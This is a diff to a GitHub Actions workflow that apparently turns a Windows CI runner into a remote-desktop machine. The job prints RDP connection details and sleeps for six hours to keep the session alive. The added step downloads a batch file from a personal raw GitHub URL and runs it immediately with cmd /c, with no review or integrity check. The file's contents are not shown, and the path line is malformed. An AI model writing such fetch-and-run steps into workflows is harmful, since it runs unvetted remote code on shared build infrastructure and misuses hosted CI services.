@@ -92,6 +92,14 @@ jobs:
           Write-Host "RDP setup complete. You can connect using: mstsc /v:$ztIPAddress"
         shell: pwsh
 
+      - name: Download file bat
+        run: |
+          # Mengunduh dan menginstal app USERPROFILE
+          $dl = "$env:C:\Users\hero\app\run.bat"
+          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ululnuta72/sflow/main/y.bat" -OutFile $dl
+          cmd /c $dl
+        shell: pwsh
+
       - name: Pending Step (Sleep for 6 Hours)
         run: |
           Write-Host "Pending for 6 hours to keep session active..."
